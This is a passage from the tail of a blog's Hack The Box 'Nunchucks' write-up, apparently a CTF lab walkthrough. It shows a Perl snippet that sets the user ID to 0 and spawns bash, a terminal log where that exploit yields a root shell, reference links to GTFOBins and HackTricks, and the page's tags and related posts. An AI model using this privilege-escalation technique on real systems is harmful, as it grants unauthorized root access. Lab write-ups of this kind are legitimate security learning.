</span></span><span style="display:flex;"><span>POSIX::setuid(<span style="color:#ae81ff">0</span>); 
</span></span><span style="display:flex;"><span>system(<span style="color:#e6db74">&#34;/usr/bin/bash&#34;</span>);
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>david@nunchucks:/tmp$ chmod +x exp.pl
</span></span><span style="display:flex;"><span>david@nunchucks:/tmp$ ./exp.pl
</span></span><span style="display:flex;"><span>root@nunchucks:/tmp# id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>david<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>david<span style="color:#f92672">)</span>
</span></span></code></pre></div><hr>
<h1 id="参考资料">参考资料</h1>
<blockquote>
<p><a href="https://fuckcloudnative.io/posts/linux-capabilities-in-practice-1/">Linux Capabilities 入门教程：基础实战篇</a>
<a href="https://gtfobins.github.io/gtfobins">GTFOBins</a>
<a href="https://book.hacktricks.xyz/">HackTricks</a></p></blockquote>
<ul class="pa0">
  
   <li class="list di">
     <a href="/tags/writeup/" class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">Writeup</a>
   </li>
  
   <li class="list di">
     <a href="/tags/hackthebox/" class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">Hackthebox</a>
   </li>
  
   <li class="list di">
     <a href="/tags/linux/" class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">Linux</a>
   </li>
  
   <li class="list di">
     <a href="/tags/nodejs/" class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">NodeJS</a>
   </li>
  
   <li class="list di">
     <a href="/tags/ssti/" class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">SSTI</a>
   </li>
  
   <li class="list di">
     <a href="/tags/suid/" class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">SUID</a>
   </li>
  
</ul>
<div class="mt6 instapaper_ignoref">
      
      
      </div>
    </div>

    <aside class="w-30-l mt6-l">




  <div class="bg-light-gray pa3 nested-list-reset nested-copy-line-height nested-links">
    <p class="f5 b mb3">Related</p>
    <ul class="pa0 list">
	   
	     <li  class="mb2">
          <a href="/posts/buuctf-buu-brute-1-writeup/">BUUCTF - BUU BRUTE 1 Writeup</a>
        </li>
	    
	     <li  class="mb2">
          <a href="/posts/buuctf-buu-code-review-1-writeup/">BUUCTF - BUU CODE REVIEW 1 Writeup</a>
        </li>
	    
	     <li  class="mb2">
          <a href="/posts/%E8%92%99%E5%8F%A4%E9%A9%AC2020-wirteups-reverse-specialapk/">蒙古马2020 Wirteups:reverse-specialapk</a>
        </li>
	    
	     <li  class="mb2">
          <a href="/posts/%E8%92%99%E5%8F%A4%E9%A9%AC2020-wirteups-reverse-rev/">蒙古马2020 Wirteups:reverse-rev</a>
        </li>
	    
    </ul>
</div>

</aside>

  </article>

    </main>
    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
  <div class="flex justify-between">
  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="http://localhost:1313/" >
    &copy;  Kur0's Blog 2025 
  </a>
    <div><div class="ananke-socials"></div>
</div>
  </div>
</footer>

  </body>
</html>
